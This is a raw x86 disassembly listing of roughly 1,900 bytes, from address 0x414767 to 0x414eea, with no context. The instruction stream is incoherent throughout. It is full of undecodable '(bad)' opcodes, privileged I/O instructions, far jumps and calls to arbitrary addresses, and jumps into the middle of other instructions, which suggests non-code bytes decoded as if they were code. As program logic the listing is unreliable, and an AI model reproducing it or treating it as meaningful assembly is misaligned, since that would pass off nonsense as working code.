  414767:	adc    ch,BYTE PTR es:[esi+0x76]
  41476b:	mov    ebx,DWORD PTR [edi-0x7]
  41476e:	mov    dl,0x13
  414770:	repz push esp
  414772:	pop    ebx
  414773:	cmp    eax,DWORD PTR [esi-0x606458b8]
  414779:	jae    0x4147e8
  41477b:	jge    0x41473e
  41477d:	cmp    al,0x1a
  41477f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414780:	int    0xd0
  414782:	cwde   
  414783:	xor    BYTE PTR [edi+esi*2],bl
  414786:	inc    esi
  414787:	mul    ah
  414789:	gs add eax,0xba77372
  41478f:	int3   
  414790:	dec    BYTE PTR [ecx+esi*2+0x5f]
  414794:	ficom  WORD PTR [edx+esi*8]
  414797:	push   cs
  414798:	(bad)  [ebp+0x5cd82d71]
  41479e:	push   0xa72af5f5
  4147a3:	pop    esp
  4147a4:	adc    eax,0x913c973b
  4147a9:	jno    0x41481d
  4147ab:	in     al,dx
  4147ac:	sub    edx,esp
  4147ae:	(bad)  
  4147af:	std    
  4147b0:	cmp    eax,0xd90484ce
  4147b5:	div    BYTE PTR [edx]
  4147b7:	in     eax,0xb3
  4147b9:	fidiv  DWORD PTR [ebx+0x22]
  4147bc:	cmp    ch,BYTE PTR [edx]
  4147be:	lods   al,BYTE PTR ds:[esi]
  4147bf:	test   DWORD PTR [ecx-0x35],edx
  4147c2:	lods   al,BYTE PTR ds:[esi]
  4147c3:	xchg   ebx,eax
  4147c4:	pop    ds
  4147c5:	dec    esp
  4147c6:	retf   0x7f3a
  4147c9:	cmp    al,0xe
  4147cb:	test   BYTE PTR [edi],al
  4147cd:	dec    ebx
  4147ce:	ficom  WORD PTR [ebx+eiz*8+0x35]
  4147d2:	repz pop ds
  4147d4:	loop   0x4147a4
  4147d6:	push   ds
  4147d7:	fimul  DWORD PTR [edx]
  4147d9:	imul   esp,DWORD PTR [edi-0x54ddc05a],0xb3f22b03
  4147e3:	and    edx,DWORD PTR [esi]
  4147e5:	add    al,0xd6
  4147e7:	or     BYTE PTR [edi+0x2c],dh
  4147ea:	push   edi
  4147eb:	mov    bl,0xfc
  4147ed:	fistp  QWORD PTR [eax-0x2c617e0b]
  4147f3:	pop    es
  4147f4:	rcl    DWORD PTR ds:0x8e62cb75,0xf0
  4147fb:	js     0x414871
  4147fd:	jo     0x4147e0
  4147ff:	cmp    ebx,DWORD PTR [edi]
  414801:	sbb    BYTE PTR [ecx+0x2e5cf184],0xed
  414808:	(bad)  
  414809:	adc    DWORD PTR es:[ecx-0x3],0x32
  41480e:	sbb    BYTE PTR [eax+0x7851c7ff],0x5d
  414815:	stos   DWORD PTR es:[edi],eax
  414816:	sbb    al,0xb0
  414818:	stos   DWORD PTR es:[edi],eax
  414819:	xchg   edi,eax
  41481a:	in     al,dx
  41481b:	xor    dh,BYTE PTR [ebx+0x20]
  41481e:	jg     0x414874
  414820:	sub    al,0x52
  414822:	in     eax,0x28
  414824:	inc    ebx
  414825:	cmp    DWORD PTR [edx],ecx
  414827:	jae    0x4147b3
  414829:	adc    ebp,DWORD PTR [ecx]
  41482b:	call   0x4af5:0x31bd208e
  414832:	cld    
  414833:	xor    ebx,DWORD PTR [esi]
  414835:	xchg   esp,eax
  414836:	fsubr  DWORD PTR [eax+ebx*1+0x55]
  41483a:	xor    dh,BYTE PTR [ebp-0x2089036d]
  414840:	push   esi
  414841:	inc    ebx
  414842:	dec    ebx
  414843:	stos   BYTE PTR es:[edi],al
  414844:	nop
  414845:	cdq    
  414846:	ret    
  414847:	cmp    ebp,ecx
  414849:	mov    edx,DWORD PTR [edi-0x20]
  41484c:	shl    BYTE PTR [ecx+0x52],cl
  41484f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414850:	adc    al,0x2d
  414852:	addr16 cmc 
  414854:	neg    DWORD PTR ds:0xd388a525
  41485a:	sub    dh,ah
  41485c:	cwde   
  41485d:	add    ebx,DWORD PTR [edi]
  41485f:	sub    cl,BYTE PTR [ebx-0x7c85f87b]
  414865:	fstp   TBYTE PTR [ecx]
  414867:	shl    BYTE PTR [ebx+ebx*4+0x6e0a2185],1
  41486e:	xlat   BYTE PTR es:[ebx]
  414870:	ja     0x4148c7
  414872:	add    ebp,ecx
  414874:	xchg   ecx,eax
  414875:	pop    ds
  414876:	sbb    eax,0xd57f4f8a
  41487b:	or     BYTE PTR [edx],al
  41487d:	les    esi,FWORD PTR [eax]
  41487f:	clc    
  414880:	shl    DWORD PTR [edi-0x3cd57b72],0xf4
  414887:	pop    edx
  414888:	xchg   esp,eax
  414889:	mov    ebx,0xaaf054bc
  41488e:	xor    eax,0x903815da
  414893:	mov    esp,ss
  414895:	xchg   edi,eax
  414896:	and    ch,BYTE PTR [ebx-0x5314bfb4]
  41489c:	in     eax,0x25
  41489e:	int3   
  41489f:	xchg   cl,al
  4148a1:	mov    eax,ds:0xab80b2b6
  4148a6:	push   eax
  4148a7:	pop    ecx
  4148a8:	gs push ss
  4148aa:	addr16 test al,0x1
  4148ad:	push   ecx
  4148ae:	outs   dx,BYTE PTR ds:[esi]
  4148af:	xchg   ebx,eax
  4148b0:	mov    edi,0xcdb051ac
  4148b5:	ins    BYTE PTR es:[edi],dx
  4148b6:	xchg   ebp,eax
  4148b7:	repz scas eax,DWORD PTR es:[edi]
  4148b9:	add    eax,0xb41991f4
  4148be:	mov    eax,ds:0xdd2670c5
  4148c3:	cld    
  4148c4:	mov    WORD PTR [edx],gs
  4148c6:	inc    ebp
  4148c7:	or     esi,edx
  4148c9:	(bad)  
  4148ca:	out    dx,eax
  4148cb:	mov    dh,BYTE PTR [esi]
  4148cd:	enter  0x4e88,0xd7
  4148d1:	das    
  4148d2:	iret   
  4148d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148d4:	push   ss
  4148d5:	push   ds
  4148d6:	adc    esp,DWORD PTR [esi+eax*1-0x59]
  4148da:	mov    BYTE PTR [ecx],0x56
  4148dd:	sahf   
  4148de:	inc    eax
  4148df:	dec    eax
  4148e0:	jg     0x414917
  4148e2:	xchg   esp,eax
  4148e3:	dec    bh
  4148e5:	loope  0x4148d4
  4148e7:	call   0xcbb644b2
  4148ec:	lods   al,BYTE PTR ds:[esi]
  4148ed:	ficomp WORD PTR [ebx]
  4148ef:	pop    esi
  4148f0:	pop    ecx
  4148f1:	cmp    BYTE PTR [ebx],cl
  4148f3:	add    cl,BYTE PTR [edi-0x65]
  4148f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148f7:	(bad)  
  4148f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148f9:	pop    ebx
  4148fa:	stos   BYTE PTR es:[edi],al
  4148fb:	popf   
  4148fc:	pusha  
  4148fd:	adc    al,0x26
  4148ff:	pop    esp
  414900:	(bad)  
  414902:	inc    edi
  414903:	xlat   BYTE PTR ds:[ebx]
  414904:	hlt    
  414905:	clc    
  414906:	sub    BYTE PTR [ebx+0x3f],cl
  414909:	push   es
  41490a:	shl    DWORD PTR [esi+0x32a3fe1c],1
  414910:	call   0x89fc:0x9b9e1ab2
  414917:	mov    es,ebp
  414919:	sbb    DWORD PTR [esi-0x9],ebx
  41491c:	stos   DWORD PTR es:[edi],eax
  41491d:	cmp    DWORD PTR [ecx-0x55],ebp
  414920:	mov    ah,0xbe
  414922:	sbb    BYTE PTR [ebp+0x4e],dh
  414925:	nop
  414926:	iret   
  414927:	jns    0x414925
  414929:	mov    ss,edx
  41492b:	in     eax,dx
  41492c:	aam    0x30
  41492e:	jmp    0x414971
  414930:	aad    0x3
  414932:	add    edi,DWORD PTR cs:[edx+ebp*4-0x19]
  414937:	enter  0x1c09,0x17
  41493b:	inc    ebx
  41493c:	push   ebx
  41493d:	outs   dx,BYTE PTR gs:[esi]
  41493f:	pusha  
  414940:	out    0x9b,al
  414942:	aas    
  414943:	xor    DWORD PTR [ecx+eax*2+0x57],ecx
  414947:	dec    edx
  414948:	pushf  
  414949:	cmp    eax,0x341c7bbf
  41494e:	stc    
  41494f:	jbe    0x4148e5
  414951:	pop    ss
  414952:	cli    
  414953:	jmp    0x9ea3:0x2633b3d6
  41495a:	(bad)  [eax]
  41495c:	jbe    0x41490d
  41495e:	rdtsc  
  414960:	dec    ebx
  414961:	mov    bl,0x3a
  414963:	enter  0x9f15,0x23
  414967:	pushf  
  414968:	cli    
  414969:	mov    esp,0x3b2d5a53
  41496e:	shl    DWORD PTR [edi-0x2b37cdf8],1
  414974:	pop    ecx
  414975:	push   0x63
  414977:	in     al,dx
  414978:	(bad)  
  414979:	and    eax,0x4ac625dd
  41497e:	inc    esi
  41497f:	cmc    
  414980:	and    dh,BYTE PTR [edx-0x253a9ee7]
  414986:	into   
  414987:	push   0x16
  414989:	jb     0x4149a6
  41498b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41498c:	inc    ebp
  41498d:	imul   edx,DWORD PTR [eax-0x2cfe317e],0xd46b9455
  414997:	jnp    0x414988
  414999:	js     0x41495f
  41499b:	add    DWORD PTR [ecx-0x69f06ea],0x3b
  4149a2:	or     DWORD PTR [ebx-0x5a],esi
  4149a5:	lock cmp eax,0x31fb0bd3
  4149ab:	cmp    cl,BYTE PTR [eax-0x4831a801]
  4149b1:	mov    edi,0xd2411da9
  4149b6:	jl     0x414a31
  4149b8:	mov    eax,ds:0x9dd7e927
  4149bd:	cmp    eax,DWORD PTR [ebx+edx*4]
  4149c0:	aaa    
  4149c1:	mov    ebx,0x903ab135
  4149c6:	lea    eax,[edx+0x1c]
  4149c9:	fwait
  4149ca:	xchg   DWORD PTR [edx],esp
  4149cc:	inc    ecx
  4149cd:	jo     0x414a43
  4149cf:	out    0xe8,eax
  4149d1:	clc    
  4149d2:	jge    0x414997
  4149d4:	mov    ebp,gs
  4149d6:	push   ebx
  4149d7:	addr16 mov ds:0x5e64,eax
  4149db:	cmp    BYTE PTR [esp+ebp*8],ch
  4149de:	jno    0x414a54
  4149e0:	cdq    
  4149e1:	pop    eax
  4149e2:	sbb    DWORD PTR [ebx+0x7b79181c],0x3881bdca
  4149ec:	adc    eax,0xb794b6a6
  4149f1:	or     ebx,DWORD PTR ds:0xcb652dfd
  4149f7:	xor    al,0x9f
  4149f9:	(bad)  
  4149fa:	inc    eax
  4149fb:	in     eax,dx
  4149fc:	inc    edi
  4149fd:	mov    ch,0x1e
  4149ff:	mov    esi,0x888d789a
  414a04:	jmp    0x8d1eb5bf
  414a09:	out    0x86,eax
  414a0b:	xor    eax,0xba3dddd6
  414a10:	xchg   ebx,eax
  414a11:	add    cl,al
  414a13:	ss sub eax,0xc0be418b
  414a19:	mov    esi,0xec970610
  414a1e:	pop    ss
  414a1f:	mov    WORD PTR [eax+esi*2+0x634a266a],ds
  414a26:	div    al
  414a28:	in     al,0xb4
  414a2a:	rcr    DWORD PTR [esi],cl
  414a2c:	mov    bh,cl
  414a2e:	mov    dh,0xaf
  414a30:	imul   eax
  414a32:	das    
  414a33:	in     al,dx
  414a34:	xor    ah,bl
  414a36:	cmp    DWORD PTR [eax+0x110f4e2c],ebp
  414a3c:	imul   eax,DWORD PTR [esi+0xff5d4ae],0xffffffa3
  414a43:	mov    dl,0x2
  414a45:	push   eax
  414a46:	or     BYTE PTR [esp+esi*8],ah
  414a49:	ret    0xba1e
  414a4c:	push   edi
  414a4d:	aas    
  414a4e:	inc    ecx
  414a4f:	leave  
  414a50:	dec    ecx
  414a51:	(bad)  
  414a52:	mov    eax,ds:0x932b3d92
  414a57:	sub    bh,BYTE PTR [edx+0x32]
  414a5a:	xchg   ecx,eax
  414a5b:	(bad)  
  414a5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a5d:	push   es
  414a5e:	sbb    al,0x20
  414a60:	inc    esi
  414a61:	es inc esp
  414a63:	inc    ebx
  414a64:	sti    
  414a65:	pop    eax
  414a66:	xlat   BYTE PTR ds:[ebx]
  414a67:	sub    al,bl
  414a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a6a:	arpl   WORD PTR [ecx],di
  414a6c:	aad    0xcc
  414a6e:	int3   
  414a6f:	inc    esp
  414a70:	pop    ebx
  414a71:	and    al,0x37
  414a73:	mov    WORD PTR [ecx-0x37],gs
  414a76:	inc    eax
  414a77:	in     eax,0x2f
  414a79:	cmc    
  414a7a:	push   ss
  414a7b:	sbb    eax,0x1a957a92
  414a80:	and    eax,0x8730c4a4
  414a85:	and    esp,DWORD PTR [ebp+ebx*1-0x3530bfa3]
  414a8c:	and    al,0x6d
  414a8e:	push   es
  414a8f:	inc    edx
  414a90:	(bad)  
  414a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a92:	fstp   DWORD PTR [ebp-0x67]
  414a95:	sbb    edx,DWORD PTR [eax]
  414a97:	xchg   ebx,eax
  414a98:	jecxz  0x414a93
  414a9a:	or     al,0x52
  414a9c:	aam    0x91
  414a9e:	push   ss
  414a9f:	dec    edx
  414aa0:	ss jp  0x414af4
  414aa3:	ss mov ebp,0xe39415b3
  414aa9:	in     eax,dx
  414aaa:	xor    eax,0xee5ded42
  414aaf:	mov    eax,ds:0xa8e86088
  414ab4:	in     al,0xa8
  414ab6:	test   esi,ecx
  414ab8:	int3   
  414ab9:	les    edi,FWORD PTR [ecx]
  414abb:	push   es
  414abc:	cmp    ah,BYTE PTR [ecx+0xf]
  414abf:	inc    ebp
  414ac0:	fs xor bl,cl
  414ac3:	cmp    eax,0x6de07178
  414ac8:	stos   BYTE PTR es:[edi],al
  414ac9:	cmp    BYTE PTR [ebp+0x6f],dl
  414acc:	arpl   bp,bx
  414ace:	sbb    al,0x5d
  414ad0:	loopne 0x414a82
  414ad2:	aad    0x9a
  414ad4:	rcl    DWORD PTR [ebp-0x27c9e34],0x78
  414adb:	sub    ecx,esi
  414add:	(bad)  
  414ade:	mov    eax,ds:0x9fdf62c
  414ae3:	add    BYTE PTR [esi+0x5609ce30],cl
  414ae9:	push   esp
  414aea:	sub    BYTE PTR [eax],cl
  414aec:	xchg   DWORD PTR [esi+0x7b],eax
  414aef:	or     ah,BYTE PTR [ecx]
  414af1:	aaa    
  414af2:	mov    eax,ds:0x838e673c
  414af7:	jno    0x414a87
  414af9:	mov    dl,0x37
  414afb:	fsub   DWORD PTR [eax]
  414afd:	in     eax,0xf3
  414aff:	xchg   esi,eax
  414b00:	mov    ah,0x60
  414b02:	cmp    al,0x6f
  414b04:	mov    ebx,0x49e9371
  414b09:	dec    esp
  414b0a:	or     BYTE PTR [edi],bl
  414b0c:	xor    DWORD PTR [ebx+0x1f],0xf238c06c
  414b13:	dec    edx
  414b14:	cmp    eax,0xb57d6c3e
  414b19:	repnz neg ecx
  414b1c:	sbb    eax,0x8a4697c8
  414b21:	add    ecx,eax
  414b23:	push   esi
  414b24:	nop
  414b25:	icebp  
  414b26:	dec    edx
  414b27:	xor    ah,bh
  414b29:	and    DWORD PTR [ebx-0x7c],eax
  414b2c:	pop    eax
  414b2d:	lds    esp,FWORD PTR [esi-0x42d51144]
  414b33:	adc    eax,0x7442ec49
  414b39:	aad    0xbd
  414b3b:	(bad)  
  414b3c:	inc    edi
  414b3d:	mov    esi,0xcb71f0a3
  414b42:	imul   ebp,esp,0xffffffcf
  414b45:	lods   eax,DWORD PTR ds:[esi]
  414b46:	mov    esp,0xd1d94477
  414b4b:	push   edi
  414b4c:	bound  edx,QWORD PTR [edx+ebx*1+0x5f]
  414b50:	adc    ah,dl
  414b52:	inc    ecx
  414b53:	cmp    al,dl
  414b55:	fwait
  414b56:	xor    al,0x48
  414b58:	(bad)  
  414b59:	out    0xe2,eax
  414b5b:	and    dl,BYTE PTR [ebx+0xe]
  414b5e:	shl    BYTE PTR [ebx+0x5d],cl
  414b61:	dec    edi
  414b62:	in     eax,dx
  414b63:	icebp  
  414b64:	jmp    0x19bc5a30
  414b69:	jae    0x414ba8
  414b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b6d:	fiadd  DWORD PTR ds:0xf25ed3a7
  414b73:	cs mov ebp,0x48896868
  414b79:	in     al,dx
  414b7a:	sub    bh,BYTE PTR [edi+0x78b80177]
  414b80:	mov    ah,0x66
  414b82:	loop   0x414bf6
  414b84:	sti    
  414b85:	test   eax,0xef01f6c8
  414b8a:	cmp    BYTE PTR ds:[ebx-0x2e],al
  414b8e:	test   BYTE PTR [ebp+0x73],ah
  414b91:	pop    esp
  414b92:	and    BYTE PTR [ebp+0x54],ch
  414b95:	pop    esp
  414b96:	cli    
  414b97:	pusha  
  414b98:	(bad)  
  414b99:	and    eax,eax
  414b9b:	cdq    
  414b9c:	stos   DWORD PTR es:[edi],eax
  414b9d:	inc    eax
  414b9e:	sbb    edi,DWORD PTR [ebp-0x7fc10b41]
  414ba4:	xchg   ecx,eax
  414ba5:	sbb    BYTE PTR ds:0xe60f5e9d,dl
  414bab:	retf   
  414bac:	idiv   DWORD PTR [ebx]
  414bae:	stos   BYTE PTR es:[edi],al
  414baf:	in     eax,0x29
  414bb1:	lods   al,BYTE PTR ds:[esi]
  414bb2:	ja     0x414b92
  414bb4:	test   ebx,ecx
  414bb6:	fnstcw WORD PTR [ecx+0x54f3fd36]
  414bbc:	neg    BYTE PTR [edi]
  414bbe:	sbb    edi,eax
  414bc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bc1:	sahf   
  414bc2:	mov    ds:0x4e523b07,eax
  414bc7:	loop   0x414bc7
  414bc9:	imul   ebp,DWORD PTR [eax+ecx*2+0x24],0xa80f34fe
  414bd1:	mov    ebp,esp
  414bd3:	xor    cl,ah
  414bd5:	sub    eax,0xebac4b15
  414bda:	pop    ebp
  414bdb:	mov    BYTE PTR [bp+di-0x1ec5],dl
  414be0:	outs   dx,DWORD PTR ds:[esi]
  414be1:	leave  
  414be2:	pusha  
  414be3:	mov    dh,0x41
  414be5:	bound  esi,QWORD PTR [ebp-0x57505b05]
  414beb:	pop    esp
  414bec:	mov    ds:0x18d75c79,eax
  414bf1:	imul   esi,DWORD PTR [esi+0x51e86c0a],0xc2d005e9
  414bfb:	ja     0x414b84
  414bfd:	enter  0x3da1,0x11
  414c01:	jbe    0x414be4
  414c03:	lods   al,BYTE PTR ds:[esi]
  414c04:	and    ecx,ebx
  414c06:	sbb    BYTE PTR [ecx-0x22db3686],ch
  414c0c:	ret    
  414c0d:	adc    eax,0xba56a9a4
  414c12:	mov    BYTE PTR [edi],bl
  414c14:	cmp    edx,ecx
  414c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c18:	test   DWORD PTR [eax],ecx
  414c1a:	mov    ch,0x85
  414c1c:	push   ds
  414c1d:	cmp    ecx,DWORD PTR [edx]
  414c1f:	xor    DWORD PTR [edx+ecx*4],edx
  414c22:	xor    BYTE PTR [ecx],0xbc
  414c25:	xchg   esi,eax
  414c27:	jb     0x414c99
  414c29:	ins    DWORD PTR es:[edi],dx
  414c2a:	mov    esi,0x66841b98
  414c2f:	xchg   ecx,eax
  414c30:	lods   eax,DWORD PTR ds:[esi]
  414c31:	adc    al,0xca
  414c33:	sti    
  414c34:	add    al,0x55
  414c36:	aam    0xf1
  414c38:	dec    eax
  414c39:	ret    0x6e0
  414c3c:	imul   ecx,DWORD PTR [edx],0xfa4b544d
  414c42:	mov    eax,ds:0x548cadb8
  414c47:	sub    dh,BYTE PTR [ebp+0x3c]
  414c4a:	cmp    eax,eax
  414c4c:	jmp    0x553a:0x64b9b48d
  414c53:	ror    BYTE PTR [eax+ecx*8+0x1517a337],1
  414c5a:	(bad)  
  414c5b:	xchg   edi,eax
  414c5c:	xor    eax,0xadf5ecf
  414c61:	shl    DWORD PTR ds:0x755ea243,1
  414c67:	setle  al
  414c6a:	mov    edi,0x296d389f
  414c6f:	adc    eax,0x78947899
  414c74:	pop    eax
  414c75:	pop    ds
  414c76:	pop    ss
  414c77:	sub    DWORD PTR [ebx],ebx
  414c79:	mov    eax,ds:0xdcc7c33f
  414c7e:	mov    cs,WORD PTR [esi]
  414c80:	mov    edi,DWORD PTR [ebx-0x77c27b4f]
  414c86:	adc    eax,ebp
  414c88:	add    al,0xe4
  414c8a:	call   0x2c9b1aef
  414c8f:	aaa    
  414c90:	std    
  414c91:	cmp    eax,0x40536bae
  414c96:	scas   al,BYTE PTR es:[edi]
  414c97:	scas   al,BYTE PTR es:[edi]
  414c98:	pusha  
  414c99:	fwait
  414c9a:	call   0x1d3a2a6d
  414c9f:	lods   eax,DWORD PTR ds:[esi]
  414ca0:	std    
  414ca1:	adc    eax,0xa5f2aa89
  414ca6:	xchg   esp,eax
  414ca7:	fnsave [ebx-0x65]
  414caa:	cmp    ch,BYTE PTR [eax+0x3d8e36b4]
  414cb0:	cwde   
  414cb1:	jne    0x414cb5
  414cb3:	fcom   st(0)
  414cb5:	adc    BYTE PTR [edx-0x2d],ch
  414cb8:	inc    esp
  414cb9:	stos   DWORD PTR es:[edi],eax
  414cba:	out    dx,al
  414cbb:	(bad)  
  414cbc:	daa    
  414cbd:	outs   dx,DWORD PTR ss:[esi]
  414cbf:	push   ebx
  414cc0:	xor    DWORD PTR [edi-0x17e0c9d3],edx
  414cc6:	mov    ah,dh
  414cc8:	clc    
  414cc9:	push   cs
  414cca:	and    al,BYTE PTR [edx-0x21]
  414ccd:	add    ebp,esp
  414ccf:	inc    esp
  414cd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cd1:	mov    ebx,0x8031907f
  414cd6:	xor    al,ch
  414cd8:	je     0x414ca8
  414cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cdb:	cmp    ebx,DWORD PTR [ebx+eiz*8-0x7b]
  414cdf:	cmp    ch,BYTE PTR [edi+0x1cf6980e]
  414ce5:	mov    ebx,0x5b82b217
  414cea:	jo     0x414c7d
  414cec:	ss icebp 
  414cee:	pop    ebp
  414cef:	(bad)  [edx]
  414cf1:	add    eax,0xe522e2ff
  414cf6:	xchg   ecx,eax
  414cf7:	scas   al,BYTE PTR es:[edi]
  414cf8:	add    edx,DWORD PTR [ecx+0x46]
  414cfb:	(bad)  
  414cfc:	sbb    ecx,DWORD PTR [edi-0x41a38615]
  414d02:	or     BYTE PTR [eax-0x4373ec4c],0xf3
  414d09:	aam    0x12
  414d0b:	adc    BYTE PTR [edx],ah
  414d0d:	push   ebp
  414d0e:	sbb    esp,DWORD PTR [edi+0x4c163df1]
  414d14:	sahf   
  414d15:	xor    edi,DWORD PTR [ebx]
  414d17:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  414d19:	pop    eax
  414d1a:	xor    DWORD PTR [esi],edi
  414d1c:	push   ss
  414d1d:	add    al,0x8b
  414d1f:	cmp    eax,DWORD PTR [ecx-0xf8c02bd]
  414d25:	add    al,0x81
  414d27:	sti    
  414d28:	xchg   ecx,eax
  414d29:	mov    esi,0x3997b808
  414d2e:	or     eax,0x923d6ac5
  414d33:	pop    edi
  414d34:	add    DWORD PTR [edx+0x2b],ecx
  414d37:	(bad)  [eax+esi*2+0x68]
  414d3b:	shl    esi,1
  414d3d:	(bad)  
  414d3e:	dec    ebx
  414d3f:	jbe    0x414d2e
  414d41:	adc    ebx,edx
  414d43:	and    al,0xef
  414d45:	jae    0x414d94
  414d47:	and    eax,0x3818744b
  414d4c:	shr    BYTE PTR [eax+eiz*4-0x32],cl
  414d50:	rcr    BYTE PTR [ebp-0x24],1
  414d53:	lods   al,BYTE PTR ds:[esi]
  414d54:	and    BYTE PTR [ebx],dl
  414d56:	xchg   esp,eax
  414d57:	add    DWORD PTR [ebx],esi
  414d59:	push   ecx
  414d5a:	mov    ch,0x16
  414d5c:	push   cs
  414d5d:	dec    ecx
  414d5e:	stos   BYTE PTR es:[edi],al
  414d5f:	or     ebp,DWORD PTR [ebx+0x56]
  414d62:	mov    edx,0xc1a3fc88
  414d67:	mov    ds:0x6e94bace,eax
  414d6c:	mov    ebx,0xa4fe86ef
  414d71:	dec    ebp
  414d72:	jmp    0x8fcf:0xb86b2cc8
  414d79:	push   ss
  414d7a:	sbb    dh,BYTE PTR [ebp-0x70e3084d]
  414d80:	jns    0x414d3e
  414d82:	(bad)  
  414d83:	ds mov ecx,0x4e0f9ed6
  414d89:	neg    BYTE PTR [esi+0x359648d9]
  414d8f:	cli    
  414d90:	pop    es
  414d91:	push   ss
  414d92:	cs dec ebx
  414d94:	jge    0x414d32
  414d96:	fsin   
  414d98:	push   ecx
  414d99:	ja     0x414d96
  414d9b:	dec    ebp
  414d9c:	loop   0x414dc9
  414d9e:	or     esp,edi
  414da0:	pop    edx
  414da1:	mov    al,0x1d
  414da3:	not    DWORD PTR [eax-0x75]
  414da6:	xlat   BYTE PTR ds:[ebx]
  414da7:	js     0x414d42
  414da9:	pop    esi
  414daa:	dec    eax
  414dab:	test   eax,edx
  414dad:	out    0x19,eax
  414daf:	adc    eax,0x2929d75e
  414db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414db5:	push   0xfffffff0
  414db7:	jp     0x414e13
  414db9:	jns    0x414db1
  414dbb:	out    dx,al
  414dbc:	test   eax,0x9a389427
  414dc1:	call   0x461ac2a4
  414dc6:	mov    dh,cl
  414dc8:	add    esi,ecx
  414dca:	xchg   esi,eax
  414dcb:	fwait
  414dcc:	mov    eax,esi
  414dce:	imul   esi,DWORD PTR [esi-0x2e5cc118],0x955d345c
  414dd8:	mov    dh,0x83
  414dda:	xchg   BYTE PTR [eax+0x68],bl
  414ddd:	(bad)  
  414dde:	sub    bl,ah
  414de0:	fstp   QWORD PTR [esi-0x14f1af96]
  414de6:	jmp    0x995d1111
  414deb:	xchg   esp,eax
  414dec:	ficomp WORD PTR [ecx]
  414dee:	repnz push edi
  414df0:	cmp    bl,BYTE PTR [ebx+0x77d72552]
  414df6:	push   edx
  414df7:	xchg   edx,eax
  414df8:	push   ebp
  414df9:	mov    BYTE PTR [ebx],bh
  414dfb:	push   0xc51fdf92
  414e00:	push   edx
  414e01:	pushf  
  414e02:	push   ecx
  414e03:	mov    sp,dx
  414e06:	jmp    0xb2eb:0x4cb1f131
  414e0d:	jle    0x414e86
  414e0f:	in     al,dx
  414e10:	mov    fs,WORD PTR [edx-0x69]
  414e13:	stos   BYTE PTR es:[edi],al
  414e14:	and    eax,0x6f6a8775
  414e19:	sar    ebx,1
  414e1b:	sub    DWORD PTR [edi],edi
  414e1d:	stc    
  414e1e:	aam    0xc7
  414e20:	inc    esp
  414e21:	(bad)  
  414e22:	cmp    bh,BYTE PTR [ecx-0x240cad79]
  414e28:	pushf  
  414e29:	xchg   esp,eax
  414e2a:	stc    
  414e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e2c:	add    al,0x11
  414e2e:	sbb    al,0x5
  414e30:	je     0x414dfa
  414e32:	shl    DWORD PTR [ebx+0x3df0fe49],cl
  414e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e39:	outs   dx,DWORD PTR ds:[esi]
  414e3a:	pushf  
  414e3b:	pop    ebp
  414e3c:	loope  0x414e69
  414e3e:	stos   BYTE PTR es:[edi],al
  414e3f:	retf   0x9da7
  414e42:	inc    ebx
  414e43:	test   dl,bh
  414e45:	jmp    0x9b5536b0
  414e4a:	(bad)  
  414e4b:	std    
  414e4c:	cmp    BYTE PTR [esi+0x5964170],cl
  414e52:	stc    
  414e53:	and    al,0xf
  414e55:	outs   dx,BYTE PTR cs:[esi]
  414e57:	lea    esi,[ecx-0x33]
  414e5a:	or     al,0x3d
  414e5c:	out    dx,al
  414e5d:	loop   0x414e07
  414e5f:	lods   al,BYTE PTR ds:[esi]
  414e60:	(bad)  
  414e61:	jns    0x414e00
  414e63:	and    DWORD PTR [eax],0x16912f45
  414e69:	sar    ah,cl
  414e6b:	call   0x5ee915ef
  414e70:	dec    edx
  414e71:	mov    BYTE PTR [eax-0x65],0x28
  414e75:	cmp    esp,DWORD PTR [ecx]
  414e77:	fs push eax
  414e79:	add    ch,dh
  414e7b:	push   ebp
  414e7c:	call   0x3eb6:0x9b015a3e
  414e83:	cld    
  414e84:	test   DWORD PTR [edx+0x67c2e41a],esp
  414e8a:	dec    esp
  414e8b:	ins    BYTE PTR es:[edi],dx
  414e8c:	jbe    0x414e0f
  414e8e:	je     0x414e3d
  414e90:	xchg   BYTE PTR [ecx+0x1a],bh
  414e93:	jnp    0x414ead
  414e95:	loopne 0x414ebc
  414e97:	ja     0x414eae
  414e99:	ins    DWORD PTR es:[edi],dx
  414e9a:	pop    edx
  414e9b:	sbb    al,0xfc
  414e9d:	inc    ebx
  414e9e:	mov    esi,0xf92760b3
  414ea3:	dec    ecx
  414ea4:	cdq    
  414ea5:	sbb    DWORD PTR [edi],edx
  414ea7:	push   cs
  414ea8:	data16 or al,0x86
  414eab:	inc    esp
  414eac:	jnp    0x414ed9
  414eae:	dec    ebx
  414eaf:	sbb    esp,DWORD PTR [edi+0x24a6c9d9]
  414eb5:	jo     0x414ea8
  414eb7:	dec    esi
  414eb8:	test   eax,0x1ac82be7
  414ebd:	retf   0x43
  414ec0:	push   cs
  414ec1:	add    esi,esp
  414ec3:	out    dx,eax
  414ec4:	cmp    cl,BYTE PTR [ebp+0x30]
  414ec7:	or     BYTE PTR [edi+0x469e55b7],al
  414ecd:	cmc    
  414ece:	dec    ecx
  414ecf:	fst    QWORD PTR [edx-0x4ac8c83b]
  414ed6:	ss push ss
  414ed8:	sbb    DWORD PTR [edx+0x10cdffe4],edi
  414ede:	push   0xffffffcb
  414ee0:	iret   
  414ee1:	jmp    0xb487:0x9fcb3859
  414ee8:	sub    al,0xe8
  414eea:	and    DWORD PTR [eax],ebp
